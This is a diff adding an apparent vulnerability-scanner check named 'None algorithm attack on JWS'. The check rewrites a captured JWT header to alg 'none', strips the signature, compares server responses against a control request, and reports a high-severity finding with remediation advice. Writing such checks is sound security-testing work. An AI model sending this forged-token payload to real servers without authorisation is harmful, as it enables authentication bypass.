@@ -1,0 +1,37 @@
+metadata:
+    language: v2-beta
+    name: "None algorithm attack on JWS"
+    description: "The JWT None algorithm attack"
+    author: "Josh Fiddler"
+    tags: "JWT", "JWS", "token"
+
+given insertion point then
+    # Check for a JWS within the insertion point. Authorization header is treat differently as the base value may be prefixed with 'Bearer'
+    if {insertion_point_base_value} matches "^(?:Bearer )?eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+" then
+
+        send payload:
+            # Update the JWS header to include 'alg' : 'none' and remove the signature
+            replacing:
+                `{regex_replace(regex_replace(insertion_point_base_value, "^(Bearer )?[a-zA-Z0-9_\-]+", "$1eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"), "[a-zA-Z0-9_\-]+$", "")}`
+
+
+        if {latest.response.status_code} is {base.response.status_code} then
+
+            # Send request with no signature without changing 'alg' value to check for false positives
+            send payload:
+                replacing:
+                    `{regex_replace(insertion_point_base_value, "[a-zA-Z0-9_\-]+$", "")}`
+
+
+            if not ({latest.response.status_code} is {base.response.status_code}) then
+
+                report issue:
+                    severity: high
+                    confidence: firm
+                    detail: "The server appears to trust JWT's with the 'none' algorithm and an empty signature!"
+                    remediation: "Ensure that the server rejects 'alg' case-insensitive none values."
+
+            end if
+        end if
+   end if
+
